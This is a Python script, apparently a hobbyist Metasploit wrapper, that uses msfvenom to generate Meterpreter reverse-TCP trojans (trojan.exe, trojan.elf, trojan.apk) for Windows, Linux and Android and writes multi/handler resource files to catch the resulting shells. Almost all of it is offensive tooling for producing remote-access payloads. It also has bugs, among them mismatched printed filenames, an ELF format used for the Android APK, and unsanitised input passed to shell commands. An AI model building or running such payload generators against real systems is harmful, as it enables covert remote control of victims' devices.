import os, time


#<--Banner-->
banner = """

:'######:'##::::'##'########:'########:'########'##::::'##:
'##... ##:##:::: ##:##.... ##:##.... ##:##.....::###::'###:
 ##:::..::##:::: ##:##:::: ##:##:::: ##:##:::::::####'####:
. ######::##:::: ##:########::########::######:::## ### ##:
:..... ##:##:::: ##:##.....:::##.. ##:::##...::::##. #: ##:
'##::: ##:##:::: ##:##::::::::##::. ##::##:::::::##:.:: ##:
. ######:. #######::##::::::::##:::. ##:########:##:::: ##:
:......:::.......::..::::::::..:::::..:........:..:::::..::  

"""

#<--Menu-->
def msf():
    os.system("clear")
    print(banner)
    print("              |                    1 -->> Windows reverse shell")
    print("              |                    2 -->> Linux reverse shell x86")
    print("              |                    3 -->> Linux reverse shell x64")
    print("              |                    4 -->> Android reverse shell")
    print("              |                    5 -->> Start msfconsole in xterm")
    print("              |                    6 -->> Start msfconsole in xterm with a .rc (you have to generate one first)")
    print("              |                    7 -->> Generate the .rc files")
    print("              |                    8 -->> Exit")
    x = input("              ↳ ")

    if x == "1":       
        print("")
        ip = input("IP -->> ")
        port = input("PORT ->> ")
        print("Creating payload...")
        os.system("msfvenom -p windows/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f exe > trojan.exe")
        print("FileName == windows.exe")
        time.sleep(2)
        while True:
            msf()

    if x == "2": 
        print("")
        ip = input("IP -->> ")
        port = input("PORT ->>")
        print("Creating payload...")
        os.system("msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f elf > trojan.elf")
        print("FileName == linux86.elf")
        time.sleep(2)
        while True:
            msf()

    if x == "3":
        print("")
        ip = input("IP -->> ")
        port = input("PORT ->> ")
        print("Creating payload...")
        os.system("msfvenom -p linux/x64/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f elf > trojan.elf")
        time.sleep(2)
        print("FileName == linux64.elf")
        while True:
            msf()

    if x == "4":
        print("")
        ip = input("IP -->> ")
        port = input("PORT ->> ")
        print("Creating payload...")
        os.system("msfvenom -p android/meterpreter/reverse_tcp LHOST="+ip+" LPORT="+port+" -f elf > trojan.apk")
        time.sleep(2)
        print("FileName == android.apk")
        while True:
            msf()

    if x == "5":
        print("")
        print("msfconsole is running...")
        os.system("xterm -e msfconsole")
        time.sleep(2)
        print("msfconsole is closing...")
        time.sleep(2)
        while True:
            msf()

    if x == "6":
        print("")
        rc = input("Name of the file (with the .rc) -->> ")
        print("msfconsole is running...")
        os.system("xterm -e msfconsole -r "+rc+"")
        time.sleep(2)
        print("msfconsole is closing...")
        time.sleep(2)
        while True:
            msf()

    if x == "7":
        rccreator()

    if x == "8":
        os.system("clear")
        print("Goodbye :D")
        exit()

#<--.rc generator-->
def rccreator():
    os.system("clear")
    print(banner)
    print("              |                    1 -->> Windows")
    print("              |                    2 -->> Linux x86")
    print("              |                    3 -->> Linux x64")
    print("              |                    4 -->> Android")
    print("              |                    5 -->> Back")
    print("              |                    6 -->> Exit")
    x = input("              ↳ ")

    if x == "1":
        print("")
        rcnamewindows = input("FILE NAME (with .rc) -->> ")
        lhostwindows = input("IP -->> ")
        lportwindows = input("PORT -->> ")
        file = open(""+rcnamewindows+"", "w")
        file.write("use exploit/multi/handler" + os.linesep)
        file.write("set payload windows/meterpreter/reverse_tcp" + os.linesep)
        file.write("set lhost "+lhostwindows+"" + os.linesep)
        file.write("set lport "+lportwindows+"" + os.linesep)
        file.write("exploit")
        file.close()
        print("Generating .rc...")
        time.sleep(2)
        print("The .rc file was generated correctly!")
        time.sleep(2)
        while True:
            rccreator()

    if x == "2":
        print("")
        rcnamelinux86 = input("FILE NAME (with .rc) -->> ")
        lhostlinux86 = input("IP -->> ")
        lportlinux86 = input("PORT -->> ")
        file = open(""+rcnamelinux86+"", "w")
        file.write("use exploit/multi/handler" + os.linesep)
        file.write("set payload linux/x86/meterpreter/reverse_tcp" + os.linesep)
        file.write("set lhost "+lhostlinux86+"" + os.linesep)
        file.write("set lport "+lportlinux86+"" + os.linesep)
        file.write("exploit")
        file.close()
        print("Generating .rc...")
        time.sleep(2)
        print("The .rc file was generated correctly!")
        time.sleep(2)
        while True:
            rccreator()

    if x == "3":
        print("")
        rcnamelinux64 = input("FILE NAME (with .rc) -->> ")
        lhostlinux64 = input("IP -->> ")
        lportlinux64 = input("PORT -->> ")
        file = open(""+rcnamelinux64+"", "w")
        file.write("use exploit/multi/handler" + os.linesep)
        file.write("set payload linux/x64/meterpreter/reverse_tcp" + os.linesep)
        file.write("set lhost "+lhostlinux64+"" + os.linesep)
        file.write("set lport "+lportlinux64+"" + os.linesep)
        file.write("exploit")
        file.close()
        print("Generating .rc...")
        time.sleep(2)
        print("The .rc file was generated correctly!")
        time.sleep(2)
        while True:
            rccreator()

    if x == "4":
        print("")
        rcnameandroid = input("FILE NAME (with .rc) -->> ")
        lhostandroid = input("IP -->> ")
        lportandroid = input("PORT -->> ")
        file = open(""+rcnameandroid+"", "w")
        file.write("use exploit/multi/handler" + os.linesep)
        file.write("set payload android/meterpreter/reverse_tcp" + os.linesep)
        file.write("set lhost "+lhostandroid+"" + os.linesep)
        file.write("set lport "+lportandroid+"" + os.linesep)
        file.write("exploit")
        file.close()
        print("Generating .rc...")
        time.sleep(2)
        print("The .rc file was generated correctly!")
        time.sleep(2)
        while True:
            rccreator()

    if x == "5":
        msf()

    if x == "6":
        exit()




#<---Start the tool-->
msf()